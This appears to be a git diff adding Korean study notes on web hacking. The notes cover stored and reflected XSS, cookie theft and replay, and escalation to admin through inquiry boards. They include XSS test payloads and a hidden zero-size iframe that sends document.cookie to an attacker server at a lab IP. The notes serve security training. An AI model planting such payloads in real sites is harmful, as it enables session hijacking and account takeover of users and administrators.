@@ -755,3 +755,50 @@ Refleced XSS
 <script>alert(1);</script>
 <script>alert("xss");</script>
 <script>alert(document.cookie);</script>
+```
+
+---
+
+### 웹 해킹 이해 - Stored XSS 취약점을 이용한 쿠키 재사용 공격
+
+Stored XSS -> 어떤 공격을 할 수 있나?
+
+1. 쿠키 정보(alerrt(document.cookie) - Victim(희생자-일반사용자, 관리자) 쿠키 -> 공격자 서버
+
+2. 쿠키 재사용 공격 (Replay Attack)
+- http-only
+- 쿠키 생성할 때: IP주소 + 쿠키 -> 암호화
+                 MAC 주소, 하드웨어의 일부 정보
+  
+3. ActiveX -> exe, dll -> Non - ActiveX -> 통합 프로그램(exe)
+
+<script>alert(1);</script>
+<script>alert(document.cookie);</script>
+<iframe src='http://192.168.206.154/cookie.php?cookie="+document.cookie+"'width=0 height=0></iframe>
+
+---
+
+### 웹 해킹 이해 - BXSS Hunter를 활용한 사용자 쿠키 정보 획득
+
+BXSS Hunter
+
+---
+
+### 웹 해킹 이해 - Stored XSS 취약점을 이용한 관리자 권한 상승
+
+1:1 문의 게시판 - 1:1 쪽지 - 1:1 문의 채팅...
+
+TEXT 형식의 글에서도 관리자쪽에서 발생할 수 있다.
+
+블랙박스 - 리얼해킹...
+
+사용자 -> 관리자 권한을 위해..
+
+xss cheat sheet
+
+브라우저별로, 버전별...
+
+---
+
+### 웹 해킹 이해 - Reflected XSS 취약점 실습
+
